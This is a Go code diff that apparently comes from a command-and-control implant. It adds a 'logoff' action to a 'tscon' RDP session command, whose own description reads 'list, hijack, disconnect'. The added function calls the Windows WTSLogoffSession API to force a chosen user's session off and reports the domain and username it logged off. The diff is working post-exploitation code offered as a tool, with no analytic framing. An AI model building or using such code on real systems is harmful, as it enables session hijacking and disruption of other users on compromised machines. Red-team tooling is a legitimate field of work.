@@ -22,6 +22,7 @@ var (
 	tsconFreeMem         = tsconWtsapi32.NewProc("WTSFreeMemory")
 	tsconConnectSession  = tsconWtsapi32.NewProc("WTSConnectSessionW")
 	tsconDisconnectSess  = tsconWtsapi32.NewProc("WTSDisconnectSession")
+	tsconLogoffSession   = tsconWtsapi32.NewProc("WTSLogoffSession")
 	tsconPidToSessionId  = tsconKernel32.NewProc("ProcessIdToSessionId")
 )
 
@@ -46,7 +47,7 @@ type TsconCommand struct{}
 
 func (c *TsconCommand) Name() string { return "tscon" }
 func (c *TsconCommand) Description() string {
-	return "RDP session management — list, hijack, disconnect"
+	return "RDP session management — list, hijack, disconnect, logoff"
 }
 
 type tsconArgs struct {
@@ -89,9 +90,18 @@ func (c *TsconCommand) Execute(task structs.Task) structs.CommandResult {
 			}
 		}
 		return tsconDisconnect(args.SessionID)
+	case "logoff":
+		if args.SessionID < 0 {
+			return structs.CommandResult{
+				Output:    "Error: -session_id required for logoff",
+				Status:    "error",
+				Completed: true,
+			}
+		}
+		return tsconLogoff(args.SessionID)
 	default:
 		return structs.CommandResult{
-			Output:    fmt.Sprintf("Unknown action: %s. Use: list, hijack, disconnect", args.Action),
+			Output:    fmt.Sprintf("Unknown action: %s. Use: list, hijack, disconnect, logoff", args.Action),
 			Status:    "error",
 			Completed: true,
 		}
@@ -212,6 +222,36 @@ func tsconDisconnect(sessionID int) structs.CommandResult {
 
 	return structs.CommandResult{
 		Output:    fmt.Sprintf("[+] Disconnected session %d", sessionID),
+		Status:    "success",
+		Completed: true,
+	}
+}
+
+func tsconLogoff(sessionID int) structs.CommandResult {
+	username := tsconQueryInfo(uint32(sessionID), tsconInfoUserName)
+	domain := tsconQueryInfo(uint32(sessionID), tsconInfoDomain)
+
+	ret, _, err := tsconLogoffSession.Call(
+		tsconServerHandle,
+		uintptr(sessionID),
+		0, // wait = false
+	)
+
+	if ret == 0 {
+		return structs.CommandResult{
+			Output:    fmt.Sprintf("Error: WTSLogoffSession failed: %v", err),
+			Status:    "error",
+			Completed: true,
+		}
+	}
+
+	msg := fmt.Sprintf("[+] Logged off session %d", sessionID)
+	if username != "" {
+		msg = fmt.Sprintf("[+] Logged off session %d (%s\\%s)", sessionID, domain, username)
+	}
+
+	return structs.CommandResult{
+		Output:    msg,
 		Status:    "success",
 		Completed: true,
 	}
